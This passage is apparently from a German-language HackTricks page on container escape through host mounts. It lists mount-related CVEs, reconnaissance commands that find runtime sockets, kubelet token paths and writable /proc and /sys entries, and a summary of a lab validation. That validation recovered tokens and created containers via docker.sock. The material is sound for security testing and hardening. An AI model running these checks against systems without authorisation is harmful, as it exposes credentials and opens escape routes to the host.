Mount- und Dateimetadaten, ohne eine mögliche Executable auszuführen.

## Mount-bezogene CVEs

Host-Mounts können auch mit Laufzeit-Schwachstellen zusammenhängen. Zu den wichtigen aktuellen Beispielen gehören:

- `CVE-2024-21626` in `runc`, bei der ein geleakter Verzeichnis-Dateideskriptor das Arbeitsverzeichnis im Host-Dateisystem platzieren konnte.
- `CVE-2024-23651`, `CVE-2024-23652` und `CVE-2024-23653` in BuildKit, bei denen bösartige Dockerfiles, Frontends und `RUN --mount`-Abläufe während Builds erneut den Zugriff auf Host-Dateien, deren Löschung oder erweiterte Berechtigungen ermöglichen konnten.
- `CVE-2024-1753` in Buildah- und Podman-Build-Abläufen, bei denen manipulierte Bind-Mounts während eines Builds `/` mit Lese- und Schreibzugriff freigeben konnten.
- `CVE-2025-47290` in `containerd` 2.1.0, bei der ein TOCTOU-Fehler beim Entpacken eines Images es einem speziell gestalteten Image ermöglichen konnte, das Host-Dateisystem während des Pull-Vorgangs zu verändern.

Diese CVEs sind hier relevant, weil sie zeigen, dass Mount-Verarbeitung nicht nur von der Konfiguration durch den Betreiber abhängt. Auch die Laufzeitumgebung selbst kann Mount-basierte Escape-Bedingungen verursachen.

## Prüfungen

Verwende diese Befehle, um die wichtigsten Mount-Expositionen schnell zu finden:

```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 -type s \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```

Was hier interessant ist:

- Host-Root, `/proc`, `/sys`, `/var` und Runtime-Sockets sind allesamt Befunde mit hoher Priorität.
- Beschreibbare `/proc`- und `/sys`-Einträge bedeuten oft, dass der Mount globale Kernel-Steuerungen des Hosts statt einer sicheren Container-Ansicht bereitstellt.
- Eingehängte `/var`-Pfade erfordern eine Überprüfung von Zugangsdaten und benachbarten Workloads, nicht nur eine Überprüfung des Dateisystems.
- Kubelet-Zustandsverzeichnisse und CNI-/Plugin-Pfade verdienen dieselbe Priorität wie Runtime-Sockets, da sie häufig direkt in den Pfaden des Nodes zur Pod-Erstellung und Verteilung von Zugangsdaten liegen.

## Status der lokalen Validierung

Die praktischen Angriffsketten auf dieser Seite wurden auf einem lokalen Linux-minikube-Node überprüft. Bei der Validierung wurden folgende Punkte reproduziert:

- Lese- und Schreibzugriff über einen temporären beschreibbaren hostPath
- Auffinden projizierter ServiceAccount-Tokens und eingehängter Secrets über `/var/lib/kubelet/pods`
- erfolgreiche Kubernetes-API-Authentifizierung mit einem gültigen Token, das aus diesem eingehängten Kubelet-Zustand wiederhergestellt wurde
- schreibgeschütztes Auffinden eines benachbarten Docker-`overlay2`-Dateisystems über ein eingehängtes `/var`
- Erstellung eines benachbarten Containers über die Docker API mit einem schreibgeschützten Host-Bind-Mount über einen eingehängten `docker.sock`
- verzögerte Ausführung auf dem Host über einen temporären, vom Host verwendeten Hook
- eine CNI-Wrapper-Simulation, bei der die Argumente, die Standardeingabe und die Ausführung des ursprünglichen Plugins unverändert blieben

Derselbe Node machte `core_pattern`, `modprobe`, `binfmt_misc/register`, `kallsyms`, `kcore` und `config.gz` zugänglich, jedoch nicht `uevent_helper`, EFI-Variablen, Thermaleinträge oder `sched_debug`. Destruktive Kernel-Trigger wurden nicht ausgeführt. Dies bestätigt, dass Angriffsketten über Host-Root, `/var`, den Kubelet-Zustand, Sockets und Host-Konsumenten reproduzierbar sind. Procfs-/sysfs-Hilfstechniken müssen hingegen abhängig vom jeweiligen Kernel, Mount-Modus, Payload-Pfad und Trigger betrachtet werden.

## References

- [1] [Lokale Dateien und Pfade, die vom Kubelet verwendet werden](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [2] [Der cilium-agent-Container kann über einen `hostPath`-Mount auf den Host zugreifen](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
